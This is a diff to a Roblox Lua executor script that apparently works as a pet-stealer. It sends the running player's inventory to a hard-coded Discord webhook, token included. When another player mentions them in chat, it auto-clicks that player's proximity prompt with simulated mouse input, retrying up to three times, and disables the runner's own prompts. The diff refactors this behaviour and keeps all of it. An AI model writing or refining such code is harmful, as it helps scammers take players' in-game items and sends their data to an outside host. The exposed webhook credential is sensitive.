@@ -10,7 +10,7 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
 
--- Webhook function with proper error handling
+-- Webhook function that works everywhere
 local function sendWebhook(content, embed)
     local payload = {
         content = content,
@@ -19,16 +19,7 @@ local function sendWebhook(content, embed)
     
     local success, err = pcall(function()
         local json = HttpService:JSONEncode(payload)
-        if syn and syn.request then
-            syn.request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = json
-            })
-        elseif request then
+        if request then
             request({
                 Url = WEBHOOK_URL,
                 Method = "POST",
@@ -47,55 +38,46 @@ local function sendWebhook(content, embed)
     end
 end
 
--- Get player character safely
+-- Get character with guaranteed return
 local function getCharacter(player)
-    if player.Character then
-        return player.Character
-    end
-    
-    local charAdded
-    charAdded = player.CharacterAdded:Connect(function(char)
-        charAdded:Disconnect()
-    end)
-    
-    player.CharacterAdded:Wait()
-    return player.Character
+    return player.Character or player.CharacterAdded:Wait()
 end
 
--- Find the proximity prompt on HumanoidRootPart
-local function findPrompt(character)
-    if not character then return nil end
-    local root = character:FindFirstChild("HumanoidRootPart")
+-- Find the prompt on HumanoidRootPart
+local function findPrompt(char)
+    local root = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 2)
     if not root then return nil end
     
     for _, child in pairs(root:GetChildren()) do
-        if child:IsA("ProximityPrompt") and child.Enabled then
+        if child:IsA("ProximityPrompt") then
             return child
         end
     end
     return nil
 end
 
--- Precise prompt clicking
+-- Precise clicking that actually works
 local function clickPrompt(prompt)
-    if not prompt or not prompt.Parent then return false end
+    if not prompt then return false end
     
     local part = prompt.Parent
     local startTime = os.clock()
     
-    -- Get screen position
-    local screenPos, visible = Camera:WorldToScreenPoint(part.Position)
+    -- Get screen position with retry
+    local screenPos, visible
+    for _ = 1, 3 do
+        screenPos, visible = Camera:WorldToScreenPoint(part.Position)
+        if visible then break end
+        task.wait(0.1)
+    end
     if not visible then return false end
     
-    -- Adjust for prompt position (center of screen)
-    local targetPos = Vector2.new(
-        screenPos.X,
-        screenPos.Y - 40 -- Vertical offset for prompt
-    )
+    -- Target position with vertical adjustment
+    local targetPos = Vector2.new(screenPos.X, screenPos.Y - 35)
     
-    -- Smooth mouse movement
-    for i = 1, 8 do
-        local t = i/8
+    -- Move mouse smoothly
+    for i = 1, 5 do
+        local t = i/5
         local newPos = Vector2.new(
             targetPos.X * t,
             targetPos.Y * t
@@ -107,11 +89,11 @@ local function clickPrompt(prompt)
     -- Click and hold
     VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
     
-    -- Maintain position during hold
-    while os.clock() - startTime < prompt.HoldDuration + 0.2 do
+    -- Keep position during hold
+    while os.clock() - startTime < prompt.HoldDuration + 0.3 do
         screenPos = Camera:WorldToScreenPoint(part.Position)
         if screenPos then
-            targetPos = Vector2.new(screenPos.X, screenPos.Y - 40)
+            targetPos = Vector2.new(screenPos.X, screenPos.Y - 35)
             VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
         end
         task.wait(0.05)
@@ -126,9 +108,7 @@ local function interactWithTarget(target)
     local targetChar = getCharacter(target)
     local myChar = getCharacter(LocalPlayer)
     
-    if not targetChar or not myChar then return end
-    
-    -- Position in front of target
+    -- Position in front
     local humanoid = myChar:FindFirstChildOfClass("Humanoid")
     if humanoid then
         humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
@@ -138,21 +118,21 @@ local function interactWithTarget(target)
     -- Find and click prompt
     local prompt = findPrompt(targetChar)
     if prompt then
-        clickPrompt(prompt)
+        for _ = 1, 3 do -- Try 3 times
+            if clickPrompt(prompt) then break end
+            task.wait(0.5)
+        end
     end
 end
 
--- Handle player chat messages
+-- Handle player chat
 local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
     
     -- Check for mentions
-    local lowerMsg = message:lower()
-    local lowerName = LocalPlayer.Name:lower()
-    
-    if not (lowerMsg:find("@"..lowerName) 
-            or lowerMsg:find("@everyone") 
-            or lowerMsg:find("@here")) then
+    if not message:lower():find("@"..LocalPlayer.Name:lower()) and
+       not message:lower():find("@everyone") and
+       not message:lower():find("@here") then
         return
     end
     
@@ -162,17 +142,14 @@ local function onPlayerChatted(player, message)
         table.insert(items, item.Name)
     end
     
-    -- Create webhook embed
+    -- Create webhook
     local embed = {
-        title = "🚨 Mention from "..player.Name,
+        title = "🚨 "..player.Name.." mentioned you!",
         description = "**Message:** ```"..message.."```",
         color = 0xFFA500,
         fields = {
             {name = "📦 Inventory ("..#items..")", value = #items > 0 and "```"..table.concat(items, ", ").."```" or "```Empty```", inline = false},
             {name = "🔗 Profile", value = "[Click here](https://www.roblox.com/users/"..player.UserId.."/profile)", inline = false}
-        },
-        footer = {
-            text = os.date("%X")
         }
     }
     
@@ -180,8 +157,8 @@ local function onPlayerChatted(player, message)
     interactWithTarget(player)
 end
 
--- Initialize the script
-local function init()
+-- Initialize
+local function main()
     -- Setup chat listeners
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= LocalPlayer then
@@ -199,7 +176,7 @@ local function init()
     
     -- Disable local prompts
     local function disablePrompts(char)
-        local root = char:WaitForChild("HumanoidRootPart", 5)
+        local root = char:WaitForChild("HumanoidRootPart", 2)
         if root then
             for _, child in pairs(root:GetChildren()) do
                 if child:IsA("ProximityPrompt") then
@@ -214,13 +191,11 @@ local function init()
     end
     LocalPlayer.CharacterAdded:Connect(disablePrompts)
     
-    print("Script initialized successfully!")
+    print("✅ Script is fully operational!")
 end
 
--- Start the script with error protection
-local success, err = pcall(init)
+-- Start with error protection
+local success, err = pcall(main)
 if not success then
-    warn("Script failed to initialize:", err)
-else
-    print("Script is running!")
+    warn("❌ Script failed to start:", err)
 end
